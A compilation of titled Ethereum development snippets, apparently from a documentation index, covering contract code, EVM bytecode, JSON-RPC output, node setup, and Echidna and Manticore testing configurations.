directly.\n\nLANGUAGE: python\nCODE:\n```\ndef unknown2e7ba6ef(uint256 _param1, uint256 _param2, uint256 _param3, array _param4) payable:\n  ...\n  require _param2 == addr(_param2)\n  ...\n  if currentWindow <= _param1:\n      revert with 0, 'cannot claim for a future window'\n```\n\nLANGUAGE: python\nCODE:\n```\n  ...\n  if stor5[_claimWindow][addr(_claimFor)]:\n      revert with 0, 'Account already claimed the given window'\n```\n\nLANGUAGE: python\nCODE:\n```\n  ...\n  idx = 0\n  s = 0\n  while idx < _param4.length:\n  ...\n      if s + sha3(mem[(32 * _param4.length) + 328 len mem[(32 * _param4.length) + 296]]) > mem[(32 * idx) + 296]:\n          mem[mem[64] + 32] = mem[(32 * idx) + 296]\n          ...\n          s = sha3(mem[_62 + 32 len mem[_62]])\n          continue\n      ...\n      s = sha3(mem[_66 + 32 len mem[_66]])\n      continue\n  if unknown2eb4a7ab != s:\n      revert with 0, 'Invalid proof'\n```\n\nLANGUAGE: python\nCODE:\n```\n  call addr(_param2) with:\n     value unknown81e580d3[_param1] * _param3 / 100 * 10^6 wei\n       gas 30000 wei\n```\n\nLANGUAGE: python\nCODE:\n```\n  if not return_data.size:\n      if not ext_call.success:\n          require ext_code.size(stor2)\n          call stor2.deposit() with:\n             value unknown81e580d3[_param1] * _param3 / 100 * 10^6 wei\n```\n\nLANGUAGE: python\nCODE:\n```\n  ...\n  log 0xdbd5389f: addr(_param2), unknown81e580d3[_param1] * _param3 / 100 * 10^6, bool(ext_call.success)\n```\n\n----------------------------------------\n\nTITLE: Manually Seeding Echidna Corpus with New Test Case\nDESCRIPTION: This bash command copies an existing corpus file to create a new test case that can be modified to help Echidna find the target condition.\n\nLANGUAGE: bash\nCODE:\n```\ncp corpus/2712688662897926208.txt corpus/new.txt\n```\n\n----------------------------------------\n\nTITLE: L1StandardBridge Contract Declaration and SafeERC20 Usage\nDESCRIPTION: Declares the L1StandardBridge contract which inherits from IL1StandardBridge and CrossDomainEnabled interfaces. It also specifies the use of SafeERC20 wrappers for all IERC20 interface interactions to ensure consistent error handling.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @title L1StandardBridge\n * @dev The L1 ETH and ERC20 Bridge is a contract which stores deposited L1 funds and standard\n * tokens that are in use on L2. It synchronizes a corresponding L2 Bridge, informing it of deposits\n * and listening to it for newly finalized withdrawals.\n *\n */\ncontract L1StandardBridge is IL1StandardBridge, CrossDomainEnabled {\n    using SafeERC20 for IERC20;\n```\n\n----------------------------------------\n\nTITLE: Echidna Blacklist Configuration File\nDESCRIPTION: A YAML configuration file for Echidna that excludes specific functions (reset1 and reset2) from being called during fuzzing.\n\nLANGUAGE: yaml\nCODE:\n```\nfilterBlacklist: true\nfilterFunctions: [\"reset1\", \"reset2\"]\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Bytecode and Opcodes\nDESCRIPTION: This snippet contains the bytecode and EVM opcodes representing a compiled ERC20 token smart contract. The contract implements standard ERC20 functionality including token transfers, approvals, and balance checking. It includes SafeMath operations for preventing arithmetic overflow and proper error handling for various edge cases.\n\nLANGUAGE: bytecode\nCODE:\n```\n083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122081c840f087cef92feccb03fadc678b2708c331896ec5432b5d4c675f27b6d3e664736f6c63430006020033\n```\n\nLANGUAGE: bytecode\nCODE:\n```\nPUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x1539 CODESIZE SUB DUP1 PUSH3 0x1539 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4261736963000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4253430000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x3 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xCC SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP DUP1 PUSH1 0x4 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xE5 SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP PUSH1 0x12 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0xFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH3 0x116 CALLER DUP3 PUSH3 0x11D PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP PUSH3 0x438 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH3 0x1C1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1F DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x45524332303A206D696E7420746F20746865207A65726F206164647265737300 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x1D5 PUSH1 0x0 DUP4 DUP4 PUSH3 0x2FB PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x1F1 DUP2 PUSH1 0x2 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH3 0x24F DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH3 0x37F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x3CC JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x3FD JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x3FD JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x3FC JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x3DF JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x40C SWAP2 SWAP1 PUSH3 0x410 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x435 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x431 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x417 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x10F1 DUP1 PUSH3 0x448 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xA9 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x39509351 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x25F JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x2C5 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x31D JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x3A0 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x406 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x46C JUMPI PUSH2 0xA9 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xAE JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x131 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x197 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1B5 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x23B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB6 PUSH2 0x4E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xF6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xDB JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x123 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x586 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19F PUSH2 0x5A4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x221 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x5AE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x243 PUSH2 0x687 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x69E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x307 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x2DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x751 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x325 PUSH2 0x799 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x365 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x34A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x392 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x3EC PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x3B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1\n```\n\n----------------------------------------\n\nTITLE: JSON-RPC Transaction Signing Response\nDESCRIPTION: This response from the transaction signing request shows both the raw RLP-encoded signed transaction and its JSON representation. It includes the signature components (v, r, s) and the resulting transaction hash.\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"raw\": \"0xf88380018203339407a565b7ed7d7a678680a4c162885bedbb695fe080a44401a6e4000000000000000000000000000000000000000000000000000000000000001226a0223a7c9bcf5531c99be5ea7082183816eb20cfe0bbc322e97cc5c7f71ab8b20ea02aadee6b34b45bb15bc42d9c09de4a6754e7000908da72d48cc7704971491663\",\n    \"tx\": {\n      \"nonce\": \"0x0\",\n      \"maxFeePerGas\": \"0x1234\",\n      \"maxPriorityFeePerGas\": \"0x1234\",\n      \"gas\": \"0x55555\",\n      \"to\": \"0x07a565b7ed7d7a678680a4c162885bedbb695fe0\",\n      \"value\": \"0x1234\",\n      \"input\": \"0xabcd\",\n      \"v\": \"0x26\",\n      \"r\": \"0x223a7c9bcf5531c99be5ea7082183816eb20cfe0bbc322e97cc5c7f71ab8b20e\",\n      \"s\": \"0x2aadee6b34b45bb15bc42d9c09de4a6754e7000908da72d48cc7704971491663\",\n      \"hash\": \"0xeba2df809e7a612a0a0d444ccfa5c839624bdc00dd29e3340d46df3870f8a30e\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Echidna for Corpus Collection\nDESCRIPTION: YAML configuration to enable corpus collection in Echidna. This allows saving the inputs generated during fuzzing to a specified directory for later analysis or modification.\n\nLANGUAGE: yaml\nCODE:\n```\ncoverage: true\ncorpusDir: \"corpus-magic\"\n```\n\n----------------------------------------\n\nTITLE: Grouping Buttons with Chakra UI Components\nDESCRIPTION: Shows two approaches for grouping buttons in Chakra UI: using ButtonGroup or Wrap components for consistent spacing and organization.\n\nLANGUAGE: tsx\nCODE:\n```\n<ButtonGroup variant='outline' spacing={2}>\n  <Button>Button 1</Button>\n  <Button>Button 2</Button>\n</ButtonGroup>\n\n// or\n<Wrap spacing={2}>\n  <WrapItem><Button variant=\"outline\">Button 1</Button></WrapItem>\n  <WrapItem><Button variant=\"outline\">Button 2</Button></WrapItem>\n</Wrap>\n```\n\n----------------------------------------\n\nTITLE: Running Nimbus Consensus Client on Ethereum Mainnet\nDESCRIPTION: Command to start Nimbus Beacon Node on Ethereum Mainnet with connection to a Web3 provider (execution client). It enables REST API and configures JWT authentication for secure client connection.\n\nLANGUAGE: sh\nCODE:\n```\nnimbus_beacon_node \\\n    --network=mainnet \\\n    --web3-url=http://127.0.0.1:8551 \\\n    --rest \\\n    --jwt-secret=\"/path/to/jwtsecret\"\n```\n\n----------------------------------------\n\nTITLE: Implementing transferFrom Method in Vyper ERC-721\nDESCRIPTION: The transferFrom function allows the transfer of NFT ownership from one address to another by an authorized caller. It includes checks to verify the caller is authorized, the from address is valid, and the token exists.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef transferFrom(_from: address, _to: address, _tokenId: uint256):\n    \"\"\"\n    @dev Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT.\n         Throws if `_from` is not the current owner.\n         Throws if `_to` is the zero address.\n         Throws if `_tokenId` is not a valid NFT.\n    @notice The caller is responsible to confirm that `_to` is capable of receiving NFTs or else\n            they maybe be permanently lost.\n    @param _from The current owner of the NFT.\n    @param _to The new owner.\n    @param _tokenId The NFT to transfer.\n    \"\"\"\n    self._transferFrom(_from, _to, _tokenId, msg.sender)\n```\n\n----------------------------------------\n\nTITLE: Solidity Version Pragma for Optimism Bridge Contracts\nDESCRIPTION: Defines the compatible Solidity compiler versions for the bridge contracts. The pragma allows versions greater than 0.5.0 but less than 0.9.0.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >0.5.0 <0.9.0;\n```\n\n----------------------------------------\n\nTITLE: swapTokensForExactETH Implementation\nDESCRIPTION: Allows users to swap tokens for an exact amount of ETH. The function calculates the required input amount, performs the swap to WETH, unwraps the WETH to ETH, and sends it to the recipient.\n\nLANGUAGE: solidity\nCODE:\n```\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    {\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] <= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, address(this));\n        IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n    }\n```\n\n----------------------------------------\n\nTITLE: Test vérifiant la condition de richesse\nDESCRIPTION: Test qui vérifie si le contrat retourne true quand l'utilisateur a plus de tokens que requis, complétant la couverture des conditions du contrat.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"returns true if the wallet has at least 1000001 tokens\", async () => {\n  await mockERC20.mock.balanceOf\n    .withArgs(wallet.address)\n    .returns(utils.parseEther(\"1000001\"))\n  expect(await contract.check()).to.be.equal(true)\n})\n```\n\n----------------------------------------\n\nTITLE: Finding Execution Paths that Throw Exceptions\nDESCRIPTION: Example showing how to find execution paths that end with REVERT or INVALID instructions, and generate test cases for these paths.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\n\nm = ManticoreEVM()\n\nwith open('example.sol') as f:\n    source_code = f.read()\n\nuser_account = m.create_account(balance=1000)\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var)\n\n## Check if an execution ends with a REVERT or INVALID\nfor state in m.terminated_states:\n    last_tx = state.platform.transactions[-1]\n    if last_tx.result in ['REVERT', 'INVALID']:\n        print('Throw found {}'.format(m.workspace))\n        m.generate_testcase(state, 'ThrowFound')\n```\n\n----------------------------------------\n\nTITLE: Unsubscribing from Ethereum Events using eth_unsubscribe\nDESCRIPTION: Shows how to cancel an existing Ethereum WebSocket subscription using the eth_unsubscribe method. This method requires the subscription ID that was previously returned from an eth_subscribe call.\n\nLANGUAGE: json\nCODE:\n```\ncurl https://eth-mainnet.alchemyapi.io/v2/your-api-key\n-X POST\n-H \"Content-Type: application/json\"\n-d '{\"id\": 1, \"method\": \"eth_unsubscribe\", \"params\": [\"0x9cef478923ff08bf67fde6c64013158d\"]}'\n```\n\n----------------------------------------\n\nTITLE: Calculating Maximum Ethereum Supply Formula\nDESCRIPTION: Formula that defines the social contract for maximum ether supply, where n represents the number of years after the genesis block. This establishes the upper limit for any future Ethereum implementation.\n\nLANGUAGE: markdown\nCODE:\n```\n`60102216 * (1,198 + 0,26 * n)`\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for ERC20 Token Functions\nDESCRIPTION: This bytecode implements core ERC20 token functionality including transfer, approve, allowance, and balance operations. The code contains jump destinations for various token operations and includes parameter validation logic for preventing transfers to null addresses.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x83B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x452 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x41C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x908 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x4CE PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x482 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x926 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x57C JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x551 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x57C JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 